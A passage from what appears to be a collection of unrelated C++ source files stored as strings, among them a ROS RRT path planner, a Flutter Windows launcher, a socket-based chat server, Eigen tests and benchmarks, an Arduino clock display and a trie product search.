  nh.param(\"d\", d, 0.2);\n    nh.param(\"viz_tree\", viz_tree, false);\n\n    plan_pub_ = nh.advertise<nav_msgs::Path>(\"global_plan\", 1);\n\n    if (viz_tree)\n    {\n      tree_pub_ = nh.advertise<visualization_msgs::Marker>(\"tree\", 1);\n    }\n\n    initialized_ = true;\n  }\n}\n\nbool RRTGlobalPlanner::makePlan(const geometry_msgs::PoseStamped& start, const geometry_msgs::PoseStamped& goal,\n                                std::vector<geometry_msgs::PoseStamped>& plan)\n{\n  if (!initialized_)\n  {\n    ROS_ERROR(\"Global planner was not initialized, performing initialization.\");\n    initialize(name_, costmap_ros_);\n    return false;\n  }\n\n  ROS_INFO(\"Generating Global Plan with RRT.\");\n  rrt T_out = generateRRT(start, goal, this->costmap_ros_, this->robot_radius, this->goal_tol, this->K_in, this->d);\n\n  if (viz_tree)\n  {\n    visualization_msgs::Marker tree_msg;\n    init_line(&tree_msg);\n    // Publish all edges\n    for (auto edge : T_out.edges)\n    {\n      pub_line(&tree_msg, &tree_pub_, edge.at(0).x, edge.at(0).y, edge.at(1).x, edge.at(1).y);\n    }\n  }\n\n  if (T_out.success)\n  {\n    // Get Global path (clears, then sets plan)\n    getGlobalPath(&T_out, &plan, start, goal);\n    publishPlan(plan);\n    return true;\n  }\n  else\n  {\n    ROS_INFO(\"Failed to find Global Plan with RRT.\");\n    return false;\n  }\n}\n\nvoid RRTGlobalPlanner::publishPlan(const std::vector<geometry_msgs::PoseStamped>& plan)\n{\n  // create a message for the plan\n  nav_msgs::Path rviz_path;\n  rviz_path.poses.resize(plan.size());\n\n  if (plan.empty())\n  {\n    // still set a valid frame so visualization won't hit transform issues\n    rviz_path.header.frame_id = \"map\";\n    rviz_path.header.stamp = ros::Time::now();\n  }\n  else\n  {\n    rviz_path.header.frame_id = plan[0].header.frame_id;\n    rviz_path.header.stamp = plan[0].header.stamp;\n  }\n\n  // Extract the plan in world co-ordinates, we assume the plan is all in the same frame\n  for (unsigned int i = 0; i < plan.size(); i++)\n  {\n    rviz_path.poses[i] = plan[i];\n  }\n\n  plan_pub_.publish(rviz_path);\n}\n};  // namespace global_planner",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chatty\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\nclass Solution {\n  public:\n    vector<int> modifyAndRearrangeArray(vector<int> &arr) {\n        vector<int> ans;\n        int n = arr.size();\n        for(int i=0;i<n-1;i++){\n            if(arr[i] == arr[i+1]){\n                int db = arr[i] + arr[i+1];\n                arr[i] = db;\n                arr[i+1] = 0;\n            }\n            if(arr[i] != 0){\n                ans.push_back(arr[i]);\n            }\n        }\n        \n        if(arr[n-1] != 0){\n            ans.push_back(arr[n-1]);\n        }\n        int size = n - ans.size();\n        for(int i=0;i<size;i++){\n            ans.push_back(0);\n        }\n        \n        return ans;\n    }\n};\nint main() {\n    string ts;\n    getline(cin, ts);\n    int t = stoi(ts);\n    while (t--) {\n        vector<int> arr;\n        string input;\n        getline(cin, input);\n        stringstream ss(input);\n        int number;\n        while (ss >> number) {\n            arr.push_back(number);\n        }\n        Solution obj;\n        vector<int> ans = obj.modifyAndRearrangeArray(arr);\n        for (int i = 0; i < ans.size(); i++) {\n            cout << ans[i] << \" \";\n        }\n        cout << endl;\n        cout << \"~\" << endl;\n    }\n    return 0;\n}",
    "#include <bits/stdc++.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n#include <cstring> // For memset\n#include<thread>\n\nusing namespace std;\n\nmutex roomMutex;\n\nstruct Room {\n    string name;\n    vector<int> clients;\n    bool isprivate;\n    string key; // key for private room\n};\n\n// Map to strore all chat Room\nmap<string,Room> chatRooms;\n\n// New Function for System Message\n\nvoid sendSysteMessage(int clientSocket, const string& message) {\n     // Add a special prefix \"SYS:\" to mark system messages\n    string systemMessage = \"SYS:\" + message;\n    send(clientSocket, systemMessage.c_str(), systemMessage.size(), 0);\n} \n\nvoid sendMessage(const string& roomName, const string& messages, int sendersocket) {\n    lock_guard<mutex> lock(roomMutex);\n    auto& room = chatRooms[roomName];\n    for(int client: room.clients) {\n        if(client != sendersocket) {\n            // don't send the message back to sender\n            send(client,messages.c_str(), messages.size(),0);\n        }\n    }\n}\n\nvoid interactWithClient(int clientSocket) {\n    char buffer[1024] = {0};\n    string roomname;\n\n    // Ask if user want to selectt public or private\n    string menu = \"Welcome to the chat server! Choose an option: \\n1. Public\\n2. Private\";\n    sendSysteMessage(clientSocket,menu);\n\n    ssize_t bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);\n    if (bytesReceived <= 0) {\n        cerr << \"Failed to receive data and client disconnected\" << endl;\n        close(clientSocket); \n        return;\n    }\n    \n    string choice(buffer,bytesReceived);\n    memset(buffer,0,sizeof(buffer));\n\n    if(choice == \"1\") {\n        // Handle public chat rroom\n        string publicMenu = \"SERVER: Available public chat room:\\n\";\n        // List available public rrooms\n\n        {\n            lock_guard<mutex> lock(roomMutex);\n            for(const auto& [roomname,Room] : chatRooms) {\n                if(!Room.isprivate) {\n                    publicMenu += \"- \"+ roomname + \"\\n\";\n                }\n            }\n        }\n\n        publicMenu += \"Enter the name of the public chat room you want to join (or create a new one):\\n\";\n        sendSysteMessage(clientSocket,publicMenu);\n\n        bytesReceived = recv(clientSocket,buffer,sizeof(buffer),0);\n        if (bytesReceived <= 0) {\n            cerr << \"Failed to receive data and client disconnected\" << endl;\n            close(clientSocket); \n            return;\n        }\n\n        roomname = string(buffer,bytesReceived);\n        memset(buffer,0,sizeof(buffer));\n\n\n        // Add a client to a choosen public room \n        {\n           lock_guard<mutex> lock(roomMutex);\n            if(chatRooms.find(roomname) == chatRooms.end()) {\n                chatRooms[roomname] = Room{roomname, {}, false, \"\"};\n                sendSysteMessage(clientSocket, \"Created new public room: \" + roomname);\n            } else {\n                sendSysteMessage(clientSocket, \"Joined existing room: \" + roomname);\n            }\n            chatRooms[roomname].clients.push_back(clientSocket);\n        }\n\n    } else if(choice == \"2\") {\n        // handling the part of private chat room\n        string privateMenu = \"Private chat option:\\n1. create a private room\\n2. Join a private room\\n\";\n        sendSysteMessage(clientSocket,privateMenu);\n\n        bytesReceived = recv(clientSocket,buffer,sizeof(buffer),0);\n        if (bytesReceived <= 0) {\n            cerr << \"Failed to receive data and client disconnected\" << endl;\n            close(clientSocket); \n            return;\n        }\n\n        string privateChoice(buffer,bytesReceived);\n        memset(buffer,0,sizeof(buffer));\n\n        if(privateChoice == \"1\") {\n            string roomcreation = \"Enter the name of private chatroom:\\n\";\n            sendSysteMessage(clientSocket, roomcreation);\n            \n            bytesReceived = recv(clientSocket,buffer,sizeof(buffer),0);\n            if (bytesReceived <= 0) {\n                cerr << \"Failed to receive data and client disconnected\" << endl;\n                close(clientSocket); \n                return;\n            }\n\n            roomname = string(buffer,bytesReceived);\n            memset(buffer,0,sizeof(buffer));\n\n            // Generating the key for the private room\n            srand(time(0));\n            string key = to_string(rand() % 10000); \n            {\n                lock_guard<mutex> lock(roomMutex);\n                chatRooms[roomname] = Room{roomname,{},true,key};\n                chatRooms[roomname].clients.push_back(clientSocket);\n            }\n\n            string keyMessage = \"private room created, Share this key to invite the others: \" + key + \"\\n\";\n            sendSysteMessage(clientSocket,keyMessage);\n\n        }else if(privateChoice == \"2\") {\n            // Join the private room\n            string joinrooom = \"Enter the name of private room:\\n\";\n            sendSysteMessage(clientSocket,joinrooom);\n\n            bytesReceived = recv(clientSocket,buffer,sizeof(buffer),0);\n            if (bytesReceived <= 0",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2015 Benoit Steiner <benoit.steiner.goog@gmail.com>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#include \"main.h\"\n\n#include <Eigen/CXX11/Tensor>\n\n#if EIGEN_COMP_MSVC || !defined(__SIZEOF_INT128__)\n#define EIGEN_NO_INT128\n#else\ntypedef __uint128_t uint128_t;\n#endif\n\n// Only run the test on compilers that support 128bit integers natively\n#ifndef EIGEN_NO_INT128\n\nusing Eigen::internal::static_val;\nusing Eigen::internal::TensorUInt128;\n\nvoid VERIFY_EQUAL(TensorUInt128<uint64_t, uint64_t> actual, uint128_t expected) {\n  bool matchl = actual.lower() == static_cast<uint64_t>(expected);\n  bool matchh = actual.upper() == static_cast<uint64_t>(expected >> 64);\n  if (!matchl || !matchh) {\n    const char* testname = g_test_stack.back().c_str();\n    std::cerr << \"Test \" << testname << \" failed in \" << __FILE__ << \" (\" << __LINE__ << \")\" << std::endl;\n    abort();\n  }\n}\n\nvoid test_add() {\n  uint64_t incr = internal::random<uint64_t>(1, 9999999999);\n  for (uint64_t i1 = 0; i1 < 100; ++i1) {\n    for (uint64_t i2 = 1; i2 < 100 * incr; i2 += incr) {\n      TensorUInt128<uint64_t, uint64_t> i(i1, i2);\n      uint128_t a = (static_cast<uint128_t>(i1) << 64) + static_cast<uint128_t>(i2);\n      for (uint64_t j1 = 0; j1 < 100; ++j1) {\n        for (uint64_t j2 = 1; j2 < 100 * incr; j2 += incr) {\n          TensorUInt128<uint64_t, uint64_t> j(j1, j2);\n          uint128_t b = (static_cast<uint128_t>(j1) << 64) + static_cast<uint128_t>(j2);\n          TensorUInt128<uint64_t, uint64_t> actual = i + j;\n          uint128_t expected = a + b;\n          VERIFY_EQUAL(actual, expected);\n        }\n      }\n    }\n  }\n}\n\nvoid test_sub() {\n  uint64_t incr = internal::random<uint64_t>(1, 9999999999);\n  for (uint64_t i1 = 0; i1 < 100; ++i1) {\n    for (uint64_t i2 = 1; i2 < 100 * incr; i2 += incr) {\n      TensorUInt128<uint64_t, uint64_t> i(i1, i2);\n      uint128_t a = (static_cast<uint128_t>(i1) << 64) + static_cast<uint128_t>(i2);\n      for (uint64_t j1 = 0; j1 < 100; ++j1) {\n        for (uint64_t j2 = 1; j2 < 100 * incr; j2 += incr) {\n          TensorUInt128<uint64_t, uint64_t> j(j1, j2);\n          uint128_t b = (static_cast<uint128_t>(j1) << 64) + static_cast<uint128_t>(j2);\n          TensorUInt128<uint64_t, uint64_t> actual = i - j;\n          uint128_t expected = a - b;\n          VERIFY_EQUAL(actual, expected);\n        }\n      }\n    }\n  }\n}\n\nvoid test_mul() {\n  uint64_t incr = internal::random<uint64_t>(1, 9999999999);\n  for (uint64_t i1 = 0; i1 < 100; ++i1) {\n    for (uint64_t i2 = 1; i2 < 100 * incr; i2 += incr) {\n      TensorUInt128<uint64_t, uint64_t> i(i1, i2);\n      uint128_t a = (static_cast<uint128_t>(i1) << 64) + static_cast<uint128_t>(i2);\n      for (uint64_t j1 = 0; j1 < 100; ++j1) {\n        for (uint64_t j2 = 1; j2 < 100 * incr; j2 += incr) {\n          TensorUInt128<uint64_t, uint64_t> j(j1, j2);\n          uint128_t b = (static_cast<uint128_t>(j1) << 64) + static_cast<uint128_t>(j2);\n          TensorUInt128<uint64_t, uint64_t> actual = i * j;\n          uint128_t expected = a * b;\n          VERIFY_EQUAL(actual, expected);\n        }\n      }\n    }\n  }\n}\n\nvoid test_div() {\n  uint64_t incr = internal::random<uint64_t>(1, 9999999999);\n  for (uint64_t i1 = 0; i1 < 100; ++i1) {\n    for (uint64_t i2 = 1; i2 < 100 * incr; i2 += incr) {\n      TensorUInt128<uint64_t, uint64_t> i(i1, i2);\n      uint128_t a = (static_cast<uint128_t>(i1) << 64) + static_cast<uint128_t>(i2);\n      for (uint64_t j1 = 0; j1 < 100; ++j1) {\n        for (uint64_t j2 = 1; j2 < 100 * incr; j2 += incr) {\n          TensorUInt128<uint64_t, uint64_t> j(j1, j2);\n          uint128_t b = (static_cast<uint128_t>(j1) << 64) + static_cast<uint128_t>(j2);\n          TensorUInt128<uint64_t, uint64_t> actual = i / j;\n          uint128_t expected = a / b;\n          VERIFY_EQUAL(actual, expected);\n        }\n      }\n    }\n  }\n}\n\nvoid test_misc1() {\n  uint64_t incr = internal::random<uint64_t>(1, 9999999999);\n  for (uint64_t i2 = 1; i2 < 100 * incr; i2 += incr) {\n    TensorUInt128<static_val<0>, uint64_t> i(0, i2);\n    uint128_t a = static_cast<uint128_t>(i2);\n    for (uint64_t j2 = 1; j2 < 100 * incr; j2 += incr) {\n      TensorUInt128<static_val<0>, uint64_t> j(0, j2);\n      uint128_t b = static_cast<uint128_t>(j2);\n      uint64_t actual = (i * j).upper();\n      uint64_t expected = (a * b) >> 64;\n      VERIFY_IS_EQUAL(actual, expected);\n    }\n  }\n}\n\nvoid test_misc2() {\n  int64_t incr = internal::random<int64_t>(1, 100);\n  for (int64_t log_div = 0; log_div < 63; ++log_div) {\n    for (int64_t divider = 1; divider <= 1000000 * incr; divider += incr) {\n      uint64_t expected = (static_cast<uint128_t>(1) << (64 + log_div)) / static_cast<uint128_t>(divider) -\n                          (static_cast<uint128_t>(1) << 64) + 1;\n      uin",
    "#include <iostream>\n#include <bitset>\n#include <iomanip>\n\nusing namespace std;\n\n//https://www.tutorialspoint.com/cpp_standard_library/limits.htm\n//https://en.cppreference.com/w/cpp/language/types\n\nint main()\n{\n    cout << \"Welcome to numbers2\" << endl;\n    size_t min_vu, max_vu; //size_t is unsigned\n\n    min_vu = std::numeric_limits<unsigned char>::min();\n    max_vu = std::numeric_limits<unsigned char>::max();\n    cout << \"unsigned char min_vu = \" << min_vu << endl;\n    cout << \"unsigned char max_vu = \" << max_vu << endl;\n    cout << endl;\n\n    min_vu = std::numeric_limits<unsigned short>::min();\n    max_vu = std::numeric_limits<unsigned short>::max();\n    cout << \"unsigned short min_vu = \" << min_vu << endl;\n    cout << \"unsigned short max_vu = \" << max_vu << endl;\n    cout << endl;\n\n    min_vu = std::numeric_limits<unsigned int>::min();\n    max_vu = std::numeric_limits<unsigned int>::max();\n    cout << \"unsigned int min_vu = \" << min_vu << endl;\n    cout << \"unsigned int max_vu = \" << max_vu << endl;\n    cout << endl;\n\n    min_vu = std::numeric_limits<unsigned long>::min();\n    max_vu = std::numeric_limits<unsigned long>::max();\n    cout << \"unsigned long min_vu = \" << min_vu << endl;\n    cout << \"unsigned long max_vu = \" << max_vu << endl;\n    cout << endl;\n\n    min_vu = std::numeric_limits<unsigned long long>::min();\n    max_vu = std::numeric_limits<unsigned long long>::max();\n    cout << \"unsigned long long min_vu = \" << min_vu << endl;\n    cout << \"unsigned long long max_vu = \" << max_vu << endl;\n    cout << endl;\n\n    /*\n    8 bits\n    unsigned char min_vu = 0\n    unsigned char max_vu = 255\n\n    16 bits\n    unsigned short min_vu = 0\n    unsigned short max_vu = 65535\n\n    32 bits\n    unsigned int min_vu = 0\n    unsigned int max_vu = 4294967295\n\n    32 bits\n    unsigned long min_vu = 0\n    unsigned long max_vu = 4294967295\n\n    64 bits\n    unsigned long long min_vu = 0\n    unsigned long long max_vu = 18446744073709551615\n    */\n\n    //unsigned char c1;\n    long long min_v, max_v;\n\n    min_v = std::numeric_limits<char>::min();\n    max_v = std::numeric_limits<char>::max();\n    cout << \"char min_v = \" << min_v << endl;\n    cout << \"char max_v = \" << max_v << endl;\n    cout << endl;\n\n    min_v = std::numeric_limits<short>::min();\n    max_v = std::numeric_limits<short>::max();\n    cout << \"short min_v = \" << min_v << endl;\n    cout << \"short max_v = \" << max_v << endl;\n    cout << endl;\n\n    min_v = std::numeric_limits<int>::min();\n    max_v = std::numeric_limits<int>::max();\n    cout << \"int min_v = \" << min_v << endl;\n    cout << \"int max_v = \" << max_v << endl;\n    cout << endl;\n\n    min_v = std::numeric_limits<long>::min();\n    max_v = std::numeric_limits<long>::max();\n    cout << \"long min_v = \" << min_v << endl;\n    cout << \"long max_v = \" << max_v << endl;\n    cout << endl;\n\n    min_v = std::numeric_limits<long long>::min();\n    max_v = std::numeric_limits<long long>::max();\n    cout << \"long long min_v = \" << min_v << endl;\n    cout << \"long long max_v = \" << max_v << endl;\n    cout << endl;\n\n    /*\n    8 bits signed\n    char min_v = -128\n    char max_v = 127\n\n    16 bits signed\n    short min_v = -32768\n    short max_v = 32767\n\n    32 bits\n    int min_v = -2147483648\n    int max_v = 2147483647\n\n    32 bits\n    long min_v = -2147483648\n    long max_v = 2147483647\n\n    64 bits\n    long long min_v = -9223372036854775808\n    long long max_v = 9223372036854775807\n    */\n    return 0;\n}\n",
    "#include \"rtc.h\"\n\nRTC_DS3231 rtc;\nchar daysOfTheWeek[7][12] = {\"Sonntag\", \"Montag\", \"Dienstag\", \"Mittwoch\", \"Donnerstag\", \"Freitag\", \"Samstag\"};\n\nvoid initRTC() {\n    // Initialize RTC\n    if (!rtc.begin()) {\n        Serial.println(\"Couldn't find RTC\");\n        for(;;);\n    }\n\n    // Uncomment to set the RTC to the current compile time (Only need to do once)\n    rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));\n}\n\nvoid oledPrintTime() {\n    int cursorPos = getCursorPos(Time);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    DateTime now = rtc.now();\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n\n    // Print time\n    oled.setCursor(0, cursorPos);\n    oled.print(now.hour(), DEC);\n    oled.print(':');\n    oled.print(now.minute(), DEC);\n    oled.print(':');\n    oled.print(now.second(), DEC);\n}\n\nvoid oledPrintDate() {\n    int cursorPos = getCursorPos(Date);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    DateTime now = rtc.now();\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n\n    oled.setCursor(0, cursorPos);\n    oled.print(now.year(), DEC);\n    oled.print('/');\n    oled.print(now.day(), DEC);\n    oled.print('/');\n    oled.print(now.month(), DEC);\n}\n\nvoid oledPrintWeekday() {\n    int cursorPos = getCursorPos(Weekday);\n    if (cursorPos < 0) {\n        return;\n    }\n\n    DateTime now = rtc.now();\n\n    oled.setTextSize(TEXT_SIZE);\n    oled.setTextColor(TEXT_COLOR);\n\n\n    oled.setCursor(0, cursorPos);\n    oled.print(\"(\");\n    oled.print(daysOfTheWeek[now.dayOfTheWeek()]);\n    oled.print(\")\");\n}",
    "#include <iostream>\n#include <fstream>\n#include <unordered_map>\n#include <unordered_set>\n#include <vector>\n#include <set>\n#include <string>\n#include \"../include/nlohmann/json.hpp\"  // Include JSON for Modern C++ library\n#include <algorithm>  // For transform() and tolower()\n\nusing namespace std;\nusing json = nlohmann::json;\n\n// Structure to store product information\nstruct Product {\n    int key;\n    string name;\n    string category;\n    int reviews;\n};\n\n// Trie Node Structure\nstruct TrieNode {\n    unordered_map<char, TrieNode*> children;\n    set<pair<int, int>> products;  // (popularity, product key) instead of (popularity, product name)\n    bool isEndOfWord = false;\n};\n\n// Trie Class for Product Search\nclass Trie {\npublic:\n    TrieNode* root;\n    \n    Trie() {\n        root = new TrieNode();\n    }\n    \n    // Helper function to convert string to lowercase\n    static string toLowerCase(const string& str) {\n        string lowerStr = str;\n        transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower);\n        return lowerStr;\n    }\n\n    // Insert product name with popularity into the Trie (case-insensitive)\n    void insert(const string& product, int popularity, int productId) {\n        string lowerProduct = toLowerCase(product);  // Convert to lowercase\n        TrieNode* node = root;\n        for (char c : lowerProduct) {\n            if (!node->children[c]) {\n                node->children[c] = new TrieNode();\n            }\n            node = node->children[c];\n            node->products.insert({-popularity, productId});  // Insert product ID with popularity\n            if (node->products.size() > 10) {\n                node->products.erase(--node->products.end());  // Keep only top 10 by popularity\n            }\n        }\n        node->isEndOfWord = true;\n    }\n    \n    // Search for products by prefix and return top 5-10 product IDs (case-insensitive)\n    vector<int> searchByPrefix(const string& prefix) const {\n        string lowerPrefix = toLowerCase(prefix);  // Convert to lowercase\n        TrieNode* node = root;\n        for (char c : lowerPrefix) {\n            if (!node->children[c]) return {};  // Prefix not found\n            node = node->children[c];\n        }\n\n        vector<int> results;\n        for (const auto& product : node->products) {\n            results.push_back(product.second);  // Push product ID instead of name\n            if (results.size() >= 10) break;\n        }\n        return results;\n    }\n};\n\n// Function to populate products from a JSON file\nvector<Product> populateProductsFromJson(const string& filename) {\n    vector<Product> products;\n    ifstream inputFile(filename);\n    if (!inputFile.is_open()) {\n        cerr << \"Error opening file: \" << filename << endl;\n        return products;\n    }\n\n    json dataset;\n    inputFile >> dataset; // Parse JSON data from file\n\n    for (const auto& entry : dataset) {\n        Product product;\n        product.key = entry.at(\"key\").get<int>();\n        product.name = entry.at(\"name\").get<string>();\n        product.category = entry.at(\"category\").get<string>();\n        product.reviews = entry.at(\"reviews\").get<int>();\n        products.push_back(product);\n    }\n\n    return products;\n}\n\n// Function to serialize product IDs to JSON format instead of names\njson serializeResultsToJson(const string& searchTerm, const vector<int>& productIds) {\n    return json{{\"searchTerm\", searchTerm}, {\"recommendations\", productIds}};\n}\n\nint main(int argc, char* argv[]) {\n    // Check for arguments\n    if (argc < 2) {\n        cerr << \"Usage: \" << argv[0] << \" <searchTerm>\" << endl;\n        return 1;\n    }\n    \n    string searchTerm = argv[1];  // Take search term from command line\n    \n    string filename = \"dataset/MOCK_DATA.json\";  // JSON file path for products\n    vector<Product> products = populateProductsFromJson(filename);\n\n    // Create Trie and insert products (case-insensitive)\n    Trie trie;\n    for (const auto& product : products) {\n        trie.insert(product.name, product.reviews, product.key);  // Insert product ID instead of name\n    }\n\n    // Perform the search (case-insensitive)\n    vector<int> results = trie.searchByPrefix(searchTerm);\n    \n    // Convert the results to JSON format and output to standard output (stdout)\n    json result = serializeResultsToJson(searchTerm, results);\n    cout << result.dump(4) << endl;  // Indented JSON output\n\n    return 0;\n}\n",
    "// Small bench routine for Eigen available in Eigen\n// (C) Desire NUENTSA WAKAM, INRIA\n\n#include <iostream>\n#include <fstream>\n#include <iomanip>\n#include <unsupported/Eigen/SparseExtra>\n#include <Eigen/SparseLU>\n#include <bench/BenchTimer.h>\n#ifdef EIGEN_METIS_SUPPORT\n#include <Eigen/MetisSupport>\n#endif\n\nusing namespace std;\nusing namespace Eigen;\n\nint main(int argc, char **args)\n{\n//   typedef complex<double> scalar; \n  typedef double scalar; \n  SparseMatrix<scalar, ColMajor> A; \n  typedef SparseMatrix<scalar, ColMajor>::Index Index;\n  typedef Matrix<scalar, Dynamic, Dynamic> DenseMatrix;\n  typedef Matrix<scalar, Dynamic, 1> DenseRhs;\n  Matrix<scalar, Dynamic, 1> b, x, tmp;\n//   SparseLU<SparseMatrix<scalar, ColMajor>, AMDOrdering<int> >   solver;\n// #ifdef EIGEN_METIS_SUPPORT\n//   SparseLU<SparseMatrix<scalar, ColMajor>, MetisOrdering<int> > solver; \n//   std::cout<< \"ORDERING : METIS\\n\"; \n// #else\n  SparseLU<SparseMatrix<scalar, ColMajor>, COLAMDOrdering<int> >  solver;\n  std::cout<< \"ORDERING : COLAMD\\n\"; \n// #endif\n  \n  ifstream matrix_file; \n  string line;\n  int  n;\n  BenchTimer timer; \n  \n  // Set parameters\n  /* Fill the matrix with sparse matrix stored in Matrix-Market coordinate column-oriented format */\n  if (argc < 2) assert(false && \"please, give the matrix market file \");\n  loadMarket(A, args[1]);\n  cout << \"End charging matrix \" << endl;\n  bool iscomplex=false, isvector=false;\n  int sym;\n  getMarketHeader(args[1], sym, iscomplex, isvector);\n//   if (iscomplex) { cout<< \" Not for complex matrices \\n\"; return -1; }\n  if (isvector) { cout << \"The provided file is not a matrix file\\n\"; return -1;}\n  if (sym != 0) { // symmetric matrices, only the lower part is stored\n    SparseMatrix<scalar, ColMajor> temp; \n    temp = A;\n    A = temp.selfadjointView<Lower>();\n  }\n  n = A.cols();\n  /* Fill the right hand side */\n\n  if (argc > 2)\n    loadMarketVector(b, args[2]);\n  else \n  {\n    b.resize(n);\n    tmp.resize(n);\n//       tmp.setRandom();\n    for (int i = 0; i < n; i++) tmp(i) = i; \n    b = A * tmp ;\n  }\n\n  /* Compute the factorization */\n//   solver.isSymmetric(true);\n  timer.start(); \n//   solver.compute(A);\n  solver.analyzePattern(A); \n  timer.stop(); \n  cout << \"Time to analyze \" << timer.value() << std::endl;\n  timer.reset(); \n  timer.start(); \n  solver.factorize(A); \n  timer.stop(); \n  cout << \"Factorize Time \" << timer.value() << std::endl;\n  timer.reset(); \n  timer.start(); \n  x = solver.solve(b);\n  timer.stop();\n  cout << \"solve time \" << timer.value() << std::endl; \n  /* Check the accuracy */\n  Matrix<scalar, Dynamic, 1> tmp2 = b - A*x;\n  scalar tempNorm = tmp2.norm()/b.norm();\n  cout << \"Relative norm of the computed solution : \" << tempNorm <<\"\\n\";\n  cout << \"Number of nonzeros in the factor : \" << solver.nnzL() + solver.nnzU() << std::endl; \n  \n  return 0;\n}\n",
    "/*\r\n    *** autoslic.cpp ***       (normal C++)\r\n    *** autoslic_cuda.cu ***   (CUDA code version)\r\n\r\n  NOTE: cuAtompot() the CUDA (GPU) version does the bandwith limit in a different\r\n        order and will get a slightly different numerical result (particularly\r\n        for thicker spcemens). However it is faster because it can run in parallel.\r\n\r\n    autoslic::calculatePartial is not yet converted to cuda\r\n\r\n------------------------------------------------------------------------\r\nCopyright 1998-2024 Earl J. Kirkland\r\n\r\nThis program is free software: you can redistribute it and/or modify\r\n    it under the terms of the GNU General Public License as published by\r\n    the Free Software Foundation, either version 3 of the License, or\r\n    (at your option) any later version.\r\n\r\n    This program is distributed in the hope that it will be useful,\r\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\r\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\r\n    GNU General Public License for more details.\r\n\r\n    You should have received a copy of the GNU General Public License\r\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\r\n\r\n---------------------- NO WARRANTY ------------------\r\nTHIS PROGRAM IS PROVIDED AS-IS WITH ABSOLUTELY NO WARRANTY\r\nOR GUARANTEE OF ANY KIND, EITHER EXPRESSED OR IMPLIED,\r\nINCLUDING BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\r\nMERCHANABILITY AND FITNESS FOR A PARTICULAR PURPOSE.\r\nIN NO EVENT SHALL THE AUTHOR BE LIABLE\r\nFOR DAMAGES RESULTING FROM THE USE OR INABILITY TO USE THIS\r\nPROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA\r\nBEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR\r\nTHIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH\r\nANY OTHER PROGRAM). \r\n------------------------------------------------------------------------\r\n\r\n  ANSI C++ and TIFF version\r\n  this version uses FFTW 3 (net about a factor of 2X faster)\r\n\r\n  There are two multithreaded (openMP) modes.  One is coarse grain\r\n  (multithread-1) and multithreaded over frozen phonon configurations\r\n  which is much faster for frozen phonon calculation. The other mode\r\n  is fine grain (multithread-2) and multithreaded over atoms in the\r\n  specimen transmission function. This mode is a little faster for\r\n  every mode. Only one can be uncommented (enabled) as both can't\r\n  be used at the same time.\r\n\r\n  FFTW choses an optimum form of the FFT at run time so there\r\n  is some variation in execution speed depending on what else \r\n  the CPU is doing during this planning stage\r\n\r\n  see:   www.fftw.org\r\n\r\n  on Windows file libfftw3f-3.dll must be in the PATH\r\n\r\n  on Linux build as:\r\n  g++ -O -fopenmp -o autoslic autoslic.cpp autosliccmd.cpp slicelib.o\r\n                       tiffsubs.o  cfpix.o -lfftw3f\r\n\r\n  Transmit an electron wave through a specimen using the\r\n  multislce method with automatic slicing.  Read in the (x,y,z)\r\n  coordinates of the whole specimen and break into slices\r\n  on-the-fly.\r\n\r\n  started 24-july-1996 E. Kirkland\r\n  working 19feb-1997 ejk\r\n  added look-up-table vzatomLUT() for 3X-4X increase \r\n        in speed 23-may-1997 ejk\r\n  put bandwith limit inside trlayer() 1-oct-1997 ejk\r\n  added Gaussian thermal displacements 1-oct-1997 ejk\r\n  removed /sqrt(3) from Thermal rms displacements \r\n    to be consistent with Int'l X-ray tables 22-dec-1997 ejk\r\n  corrected zmin/max error with thermal displac. 24-dec-1997 ejk\r\n  fixed small aliasing problem 5-jan-1998 ejk\r\n  added unit cell replication option and moved ReadXYZcoord()\r\n    into slicelib.c  11-jan-1998 ejk\r\n  added astigmatism and modify to use different set of\r\n    random offsets on each illum. angle with partial coherence\r\n         5-feb-1998 ejk\r\n  fix typo in z range message with partial coherence and\r\n    thermal vibrations 9-july-1998 ejk\r\n  update memory allocation routines 19-nov-1999 ejk\r\n  change void main() to int main() for better portability\r\n         22-jan-2000 ejk\r\n  fixed bug in zmin/zmax calculation in coherent mode\r\n     (move to 